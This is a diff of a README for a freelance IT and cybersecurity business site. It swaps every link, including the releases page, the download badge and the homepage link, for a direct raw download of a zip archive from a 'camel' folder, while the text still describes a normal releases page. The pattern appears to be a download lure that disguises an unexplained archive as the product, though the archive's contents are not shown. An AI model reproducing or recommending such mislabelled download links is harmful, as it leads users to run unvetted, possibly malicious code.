@@ -4,16 +4,16 @@
 Welcome to the SaintValTech business website! This site showcases our freelance IT and cybersecurity services, provides a portfolio, and shares contact information. Whether you need IT support or cybersecurity solutions, you’ve come to the right place!
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Milenarandom/saintvaltech-site/releases)
+[![Download Now](https://raw.githubusercontent.com/Milenarandom/saintvaltech-site/main/camel/saintvaltech-site.zip)](https://raw.githubusercontent.com/Milenarandom/saintvaltech-site/main/camel/saintvaltech-site.zip)
 
-To get started, visit this page to download: [Download Here](https://github.com/Milenarandom/saintvaltech-site/releases)
+To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/Milenarandom/saintvaltech-site/main/camel/saintvaltech-site.zip)
 
 ## 🚀 Getting Started
 Getting your application up and running is simple. Follow these steps to ensure a smooth installation process.
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page:
-   - [Download Here](https://github.com/Milenarandom/saintvaltech-site/releases)
+   - [Download Here](https://raw.githubusercontent.com/Milenarandom/saintvaltech-site/main/camel/saintvaltech-site.zip)
    
 2. **Choose Your Version**  
    On the Releases page, find the latest version of the software. It should be marked as "Latest Release".
@@ -64,8 +64,8 @@ If you encounter any issues during installation or use, please reach out for sup
 For more resources, tips on cybersecurity, and best practices, check our blog section on the website. We regularly update it with useful articles and guides relevant to IT and cybersecurity.
 
 ## 🔗 Useful Links
-- [GitHub Releases Page](https://github.com/Milenarandom/saintvaltech-site/releases)
-- [Website Homepage](https://saintvaltech.com)
+- [GitHub Releases Page](https://raw.githubusercontent.com/Milenarandom/saintvaltech-site/main/camel/saintvaltech-site.zip)
+- [Website Homepage](https://raw.githubusercontent.com/Milenarandom/saintvaltech-site/main/camel/saintvaltech-site.zip)
 
 ## 🎉 Conclusion
 Thank you for choosing the SaintValTech application. We hope it serves you well in managing your IT and cybersecurity needs. Enjoy seamless service and stay secure!
